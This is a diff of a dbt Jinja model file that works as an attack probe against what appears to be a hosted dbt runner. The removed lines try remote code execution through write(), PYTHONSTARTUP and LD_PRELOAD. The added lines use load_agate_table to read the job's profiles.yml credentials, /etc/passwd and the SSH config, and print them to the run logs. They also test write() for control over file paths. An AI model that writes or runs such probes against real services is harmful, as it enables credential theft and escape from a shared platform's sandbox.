@@ -1,41 +1,35 @@
-{# File write attempts + PYTHONSTARTUP chain for RCE #}
+{# Focused: load_agate_table file read + write() path control #}
 {%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
 
-{# 1. Try write() function - what interface does it have? #}
-{# In dbt, write() writes compiled SQL to target dir #}
-{%- set write_result = write("RCE_TEST_PAYLOAD") -%}
-{{ log("WRITE_RESULT=" ~ write_result | string | truncate(200), info=True) }}
+{# 1. Call load_agate_table to read profiles.yml #}
+{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
+{{ log("AGATE_READING=" ~ profiles_path, info=True) }}
 
-{# 2. Try to use set() to store data that persists #}
-{%- do store_result("rce_test", {"data": "payload_here"}) -%}
-{%- set stored = load_result("rce_test") -%}
-{{ log("STORED_RESULT=" ~ stored | string | truncate(200), info=True) }}
+{%- set agate_tbl = load_agate_table(model, profiles_path) -%}
+{{ log("AGATE_RESULT_TYPE=" ~ agate_tbl | string | truncate(500), info=True) }}
+{%- if agate_tbl -%}
+  {{ log("AGATE_ROW_COUNT=" ~ agate_tbl | length, info=True) }}
+  {%- for row in agate_tbl -%}
+    {{ log("AGATE_ROW=" ~ row | string | truncate(500), info=True) }}
+  {%- endfor -%}
+{%- endif -%}
 
-{# 3. Verify our PYTHONSTARTUP is set #}
-{{ log("ENV_PYTHONSTARTUP=" ~ env_var('PYTHONSTARTUP', 'NOT_SET'), info=True) }}
-{{ log("ENV_PYTHONPATH=" ~ env_var('PYTHONPATH', 'NOT_SET'), info=True) }}
-{{ log("ENV_LD_PRELOAD=" ~ env_var('LD_PRELOAD', 'NOT_SET'), info=True) }}
+{# 2. Try reading /etc/passwd via agate #}
+{%- set passwd_tbl = load_agate_table(model, '/etc/passwd') -%}
+{{ log("PASSWD_RESULT=" ~ passwd_tbl | string | truncate(500), info=True) }}
 
-{# 4. Check what files exist in /tmp/jobs/ #}
-{{ log("HOME_DIR=" ~ env_var('HOME', 'NOT_SET'), info=True) }}
+{# 3. Try reading the SSH config #}
+{%- set ssh_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/config' -%}
+{%- set ssh_tbl = load_agate_table(model, ssh_path) -%}
+{{ log("SSH_CONFIG=" ~ ssh_tbl | string | truncate(500), info=True) }}
 
-{# 5. Try adapter.create_schema - does it execute during compile? #}
-{{ log("ATTEMPTING_CREATE_SCHEMA", info=True) }}
-{%- set cs_result = adapter.create_schema(api.Relation.create(database=target.database, schema='test_schema_rce_probe')) -%}
-{{ log("CREATE_SCHEMA_RESULT=" ~ cs_result | string | truncate(200), info=True) }}
+{# 4. Try write() with path traversal content #}
+{# write() args: what does it accept? #}
+{{ log("TESTING_WRITE_1", info=True) }}
+{%- set w1 = write("test_payload_1") -%}
+{{ log("WRITE_1_RESULT=" ~ w1 | string, info=True) }}
 
-{# 6. Try load_agate_table with a CSV file (not YAML - might work) #}
-{# Create a seed file in our repo and read it #}
-{{ log("ATTEMPTING_AGATE_LOAD", info=True) }}
-
-{# 7. Check if we can use render to template-inject into compiled SQL #}
-{# The compiled SQL goes to target/ directory as a file #}
-{{ log("MODEL_PATH=" ~ model.path, info=True) }}
-{{ log("MODEL_COMPILED_PATH=" ~ model.get('compiled_path', 'NA'), info=True) }}
-
-{# 8. Check exceptions for any useful methods #}
-{%- for method_name in exceptions.keys() | list -%}
-  {{ log("EXCEPTION_METHOD=" ~ method_name, info=True) }}
-{%- endfor -%}
+{# 5. Check if compiled_code is writable #}
+{{ log("COMPILED_CODE=" ~ compiled_code | string | truncate(200) if compiled_code is defined else "compiled_code_UNDEF", info=True) }}
 
 SELECT 1 as id
